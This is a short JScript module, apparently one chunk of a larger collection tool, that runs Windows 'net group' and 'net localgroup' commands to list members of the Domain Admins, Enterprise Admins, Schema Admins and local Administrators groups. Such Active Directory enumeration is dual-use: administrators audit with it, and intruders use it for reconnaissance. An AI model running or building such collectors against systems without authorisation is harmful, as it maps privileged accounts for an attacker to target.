// chunk: ad_collectors/ad_admins
// depends: core/emit_buffer, core/run_cmd
// provides: collect_ad_admins
// format: jscript

function collect_ad_admins() {
    emit("\r\n=== AD ADMIN GROUPS ===\r\n");
    emit("--- Domain Admins ---\r\n");
    emit(_run("net group \"Domain Admins\" /domain"));
    emit("--- Enterprise Admins ---\r\n");
    emit(_run("net group \"Enterprise Admins\" /domain 2>NUL"));
    emit("--- Schema Admins ---\r\n");
    emit(_run("net group \"Schema Admins\" /domain 2>NUL"));
    emit("--- Local Admins ---\r\n");
    emit(_run("net localgroup Administrators"));
}
